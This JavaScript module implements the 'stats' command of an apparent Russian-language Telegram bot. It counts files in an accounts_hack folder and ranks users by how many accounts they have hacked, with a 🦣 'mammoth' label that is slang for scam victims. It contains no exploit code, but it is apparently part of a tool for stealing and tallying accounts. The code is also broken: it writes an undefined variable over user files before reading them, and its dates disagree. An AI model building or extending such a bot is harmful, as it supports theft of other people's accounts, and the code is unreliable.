var get_user = require("../functions/get_user"),
    save_user = require("../functions/save_user"),
    fs = require("fs");

module.exports = {
	r: /^(stats)$/i,
	f: function (msg, chatId, args, data) {
        get_user.start(chatId, (info) => {
            var accounts_hack = fs.readdirSync(`./accounts_hack`);
            var users_list = fs.readdirSync(`./users/`);

            var top_user = {
                id: 0,
                max_hack: 0
            };
            if(accounts_hack.length != 0) {
                accounts_hack.map((data_file) => {
                    data_file = data_file.replace(/.json/ig, "");
                    fs.writeFile(`../users/${data_file}.json`, JSON.stringify(file), function writeJSON(err) {
                        var user_info = JSON.parse(fs.readFileSync(`../users/${data_file}.json`, 'utf8'));
                        if(user_info.hacked_accounts > top_user.max_hack) {
                            top_user.max_hack = user_info.hacked_accounts
                            top_user.id = user_info.id
                        }
                    });
                });
            }

            if(top_user.id != 0) {
                get_user.start(top_user.id, (info_top) => {
                    var Date1 = new Date (2021, 9, 25),
                    Date2 = new Date(),
                    Days = Math.floor((Date2.getTime() - Date1.getTime())/(1000*60*60*24)),
                    top_user_info = `<b>🃏 Имя юзера:</b> <a href="tg://user?id=${info_top.id}">${info_top.name}</a>\n<b>💀 Взломанных аккаунтов:</b> ${info_top.hacked_accounts}`
    
                    data({
                        text: `<b>📊 Статистика 📊</b>\n\n<b>🐣 Регистраций в боте:</b> ${numberWithCommas(users_list.length)}\n<b>🦣 Взломанных аккаунтов:</b> ${numberWithCommas(accounts_hack.length)}\n\n<b>👑 Топ юзер 👑</b>\n${top_user_info}\n\n🏁 <b>Дата старта:</b> 25 октября 2021 | ${Days} 📅`,
                        keyboard: [[{"text": `🔄 Обновить статистику`, callback_data: "stats"}],
                        [{"text": `◀️ Назад `, callback_data: "other"},{"text": `⏪ Меню `, callback_data: "menu"}]]
                    }) 
                })
            } else {
                console.log(`123`)
                var Date1 = new Date (2022, 2, 6),
                Date2 = new Date(),
                Days = Math.floor((Date2.getTime() - Date1.getTime())/(1000*60*60*24));
                
                data({
                    text: `<b>📊 Статистика 📊</b>\n\n<b>🐣 Регистраций в боте:</b> ${numberWithCommas(users_list.length)}\n<b>🦣 Взломанных аккаунтов:</b> ${numberWithCommas(accounts_hack.length)}\n\n🏁 <b>Дата старта:</b> 6 февраля 2022 | ${Days} 📅`,
                    keyboard: [[{"text": `🔄 Обновить статистику`, callback_data: "stats"}],
                    [{"text": `◀️ Назад `, callback_data: "other"},{"text": `⏪ Меню `, callback_data: "menu"}]]
                })  
            }

            return save_user.start(chatId, info);
        });
	},
	desc: "",
	rights: 0,
	type: "all"
}

function numberWithCommas(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}